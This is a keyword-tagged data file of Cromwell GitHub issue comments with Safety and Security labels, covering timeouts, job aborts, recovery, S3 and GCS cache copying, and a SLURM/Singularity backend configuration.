scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockCon,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99698,unsafe,unsafeToFuture,99698,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"t copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1628,timeout,timeout,1628,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['timeout'],['timeout']
Safety,ternal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallTimeoutTrackingStage.executeWithTimer(A,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1519,Timeout,TimeoutExceptionHandlingStage,1519,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,"this is a critical issue of cromwell/wdltool, how did Broad avoid this issue in its internal pipeline using cromwell/wdl? this feature of WDL seems to be so commonly used in pipeline development.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-337931672:60,avoid,avoid,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-337931672,1,['avoid'],['avoid']
Safety,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1335,recover,recovery,1335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,2,['recover'],['recovery']
Safety,"tl;dr I'd like to squash / rebase / merge this despite a test failure during one run since I think that failure was due to unrelated Docker pull issues. So one build for this branch failed:. https://travis-ci.org/broadinstitute/cromwell/builds/113532462. The first failure was a docker test, and looking at this more closely something seems to have gone awry pulling the Docker image. Our build scripts should pre-pull `ubuntu:latest` and normally this takes about 10 seconds and produces a nice success message. In this run the Docker image pull took more than 43 seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpret",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:899,timeout,timeout,899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['timeout'],['timeout']
Safety,ully run google_labels_good !!! IGNORED !!!; - should successfully run google_labels_sub !!! IGNORED !!!; - should successfully run gpu_cuda_image !!! IGNORED !!!; - should successfully run gpu_on_papi_valid !!! IGNORED !!!; - should successfully run http_inputs !!! IGNORED !!!; - should successfully run http_inputs_cwl !!! IGNORED !!!; - should successfully run input_expressions !!! IGNORED !!!; - should successfully run input_from_bucket_with_requester_pays !!! IGNORED !!!; - should successfully run inter_scatter_dependencies !!! IGNORED !!!; - should successfully run invalidate_bad_caches_jes !!! IGNORED !!!; - should successfully run invalidate_bad_caches_jes_no_copy !!! IGNORED !!!; - should successfully run jes_labels !!! IGNORED !!!; - should successfully run length_slurm_no_docker !!! IGNORED !!!; - should successfully run local_gcs !!! IGNORED !!!; - should successfully run monitoring_log !!! IGNORED !!!; - should successfully run monitoring_log_papiv1 !!! IGNORED !!!; - should successfully run papi_cpu_platform !!! IGNORED !!!; - should successfully run papi_v2_log !!! IGNORED !!!; - should successfully run papiv1_streams !!! IGNORED !!!; - should successfully run prepare_scatter_gather_papi !!! IGNORED !!!; - should successfully run refresh_token !!! IGNORED !!!; - should successfully run refresh_token_sub_workflow !!! IGNORED !!!; - should successfully run requester_pays_engine_functions !!! IGNORED !!!; - should successfully run requester_pays_localization !!! IGNORED !!!; - should successfully run super_massive_array_output !!! IGNORED !!!; - should successfully run workbench_health_monitor_check_papiv1 !!! IGNORED !!!; - should successfully run workbench_health_monitor_check_papiv2 !!! IGNORED !!!; - should successfully run workflow_type_and_version_cwl !!! IGNORED !!!; - should survive a Cromwell restart and recover jobs restart_jes_with_recover !!! IGNORED !!!; - should survive a Cromwell restart when a workflow was failing and recover jobs failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:21770,recover,recover,21770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['recover'],['recover']
Safety,"uspicious:. [Travis](https://travis-ci.com/github/broadinstitute/cromwell/jobs/403803242) times out at 180m with these messages:; ```; 2020-10-22 15:23:30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:982,Abort,Abort,982,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```. This is a gsutil stacktrace. JES tried to copy the logs and failed, hence failing the job and the workflow. They might want to retry this - although we've been telling them to stop retrying too much on some things so I don't know. @geoffjentry and @cjllanwarne were talking about it on slack maybe they have an opinion. For call caching: it will get slower and slower. Basically the more jobs you run the slower it's going to be... I'm working on something to fix that but it's not in develop yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846:3496,timeout,timeout,3496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846,1,['timeout'],['timeout']
Safety,"ution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ``` . EDIT: I changed the config. Instead of using multiple locks (one lock per image) there is now one universal lock. This is becau",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:1405,timeout,timeout,1405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['timeout'],['timeout']
Safety,"wExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Starting calls: printHelloAndGoodbye.echoHelloWorld:NA:1; 2016-09-09 15:50:58,138 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - EJEA_aed1aad8:printHelloAndGoodbye.echoHelloWorld:-1:1: Effective call caching mode: CallCachingOff; 2016-09-09 15:50:58,139 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionPendingState to WorkflowExecutionInProgressState.; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from ExecutingWorkflowState to WorkflowAbortingState; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor [UUID(aed1aad8)]: Abort received. Aborting 1 EJEAs; 2016-09-09 15:51:00,402 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionInProgressState to WorkflowExecutionAbortingState.; 2016-09-09 15:51:00,416 cromwell-system-akka.dispatchers.backend-dispatcher-29 ERROR - Unexpected message KvKeyLookupFailed(KvGet(ScopedKey(aed1aad8-588d-4f84-aa09-da0f663d68c0,KvJobKey(printHelloAndGoodbye.echoHelloWorld,None,1),__jes_operation_id))).; 2016-09-09 15:51:01,316 INFO - JesRun [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JES Run ID is operations/EI6qg4TxKhid_JjDtaqaiegBINHtgZmgHSoPcHJvZHVjdGlvblF1ZXVl; 2016-09-09 15:51:01,532 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from - to Initializing; 2016-09-09 15",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:4306,Abort,Aborting,4306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['Abort'],['Aborting']
Safety,we are request that JES detect and terminate VMs that have zombie processes. The associated job should also be retried.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1042#issuecomment-229734691:24,detect,detect,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1042#issuecomment-229734691,1,['detect'],['detect']
Safety,"writing all of that crap we write to logs is a nontrivial performance impact, but we like logs so we've got to do it. we have a pretty vanilla logging setup, we could be *way* smarter about things in terms of impact to performance. this would help there. . risk of dropping is small and tunable, where as one tunes the risk down so goes the performance gain (and vice versa). one of those things where if you can live with the slight possibility that any particular specific log message never makes it you're AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294:257,risk,risk,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294,2,['risk'],['risk']
Safety,"written all the magic into, that takes some input arguments (data,; > poutputs, thresholds, etc.) and ""does the scientific thing"" to return to; > the workflow manager (cromwell) that is controlling its run via the backend.; >; > What does Singularity + Cromwell look like?; >; > People keep saying these two together, and I've been struggling to figure; > it out. I've been doing a lot of work trying to do that. What does it mean; > for Singularity to be a part of Cromwell. I first logically thought it; > would mean a backend, because the basic exec / run commands for Singularity; > don't change much (but arguments do!). But it doesn't fit well here because; > it's missing that API to make it a fully fledged service. To those familiar; > with Singularity, this is the instance command group (and not running; > containers as images). Then I thought it was really more of a workflow; > executable. But if this is the case, why is it special at all? It doesn't; > really fit because there is still going to be a lot of redundancy in; > specifying the ""singularity run bit over and over again. So I think; > (eventually) all these use cases could fit into cromwell,; >; > - running a singularity container as an executable with a backend like; > slurm; > - running a singularity container as an executable on with Local; > (host) backend; > - running a container as a backend as a container instance (via its; > API); >; > but for now, without a clean API for services, only the first two really; > make sense. Singularity is not special. It's just a binary.; > Why has it been so confusing?; >; > We get Singularity confused with Docker, because they are both containers.; > Same thing right? Sort of, but not exactly. Docker is a container; > technology, but actually it's older and has had time to develop a full API; > for services. It meets the criteria for both a backend and an executable,; > and this is because it can be conceptualized as both ""a thing that you run""; > and ""the thing th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:4643,redund,redundancy,4643,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['redund'],['redundancy']
Safety,"ymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless loop he will never retry. In it's current state it's for us not yet usable but If you open to it I can think/test things then there is a improvement on this. I can even try to get some time to do some developing but that I can't promise di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1456,recover,recovering,1456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,['recover'],['recovering']
Safety,👍 -- though it'd be nice to add the abort case too. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/916/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/916#issuecomment-223408127:36,abort,abort,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/916#issuecomment-223408127,1,['abort'],['abort']
Safety,"👍 . Something to consider for the future-- a user may want to see how often their job failed due to timeouts, so it might be interesting for this to be marked as a new state other than Failed, but it works perfectly well for the goal of this PR. [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/4220/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432671056:100,timeout,timeouts,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432671056,1,['timeout'],['timeouts']
Security," Writing new Docker configuration file; 2017/02/07 15:40:50 I: Pulling image ""leetl1220/m1:bs""; 2017/02/07 15:41:48 I: Pulled image ""leetl1220/m1:bs"" successfully.; 2017/02/07 15:41:48 I: Switching to status: localizing-files; 2017/02/07 15:41:48 I: Calling SetOperationStatus(localizing-files); 2017/02/07 15:41:48 I: SetOperationStatus(localizing-files) succeeded; 2017/02/07 15:41:48 I: Docker file /cromwell_root/exec.sh maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list;",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1234,access,access,1234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," failed. The job was stopped before the command finished. PAPI error code 10. 15: Gsutil failed: failed to upload logs for ""gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/, command failed: BadRequestException: 400 Bucket is requester pays bucket but no user project provided.; ```; Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so? Notice that the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/) does not say that requester pays does not work with Pipelines API version 1, it says instead `more information for Requester Pays can be found at: [Requester Pays](https://cloud.google.com/storage/docs/requester-pays)`. In any case, I have removed the Requester Pays option from the bucket, as I pretty much given up on that. I was then able to run the `hello.wdl` workflow fine using the configuration file above. I tried to run the `mutect2.wdl` workflow and then I have encountered a new issue when trying to localize a file in a bucket for which I have permissions to read without problems using my Google account. The error contained the following:; ```; command failed: AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage 